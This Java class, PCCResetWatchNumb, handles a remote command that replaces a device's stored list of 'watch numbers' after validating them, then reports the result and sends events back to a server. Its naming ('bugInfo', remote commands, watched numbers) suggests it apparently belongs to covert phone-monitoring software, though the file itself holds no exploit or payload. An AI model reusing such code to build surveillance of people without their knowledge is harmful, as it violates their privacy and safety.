package com.vvt.rmtcmd.pcc;

import java.util.Vector;

import com.vvt.global.Global;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.std.Constant;

public class PCCResetWatchNumb extends PCCRmtCmdSync {
		
	private SendEventManager eventSender = Global.getSendEventManager();
	
	public PCCResetWatchNumb(Vector watchList) {
		numberList = watchList;
	}
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		doPCCHeader(PhoenixCompliantCommand.RESET_WATCH_NUMBER.getId());
		
		try {
			if (isInvalidNumber()) {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.INVALID_WATCH_NUMBER);
			} else if (isExceededDB(prefBugInfo.getMaxWatchNumbers(), numberList.size())) {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.EXCEEDED_WATCH_NUMBER);
			} else {
				clearWatchNumberDB();
				addWatchNumberDB();
				responseMessage.append(Constant.OK);			
			}
			observer.cmdExecutedSuccess(this);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			observer.cmdExecutedError(this);
		}
		createSystemEventOut(responseMessage.toString());	
		// To send events
		eventSender.sendEvents();
	}
}
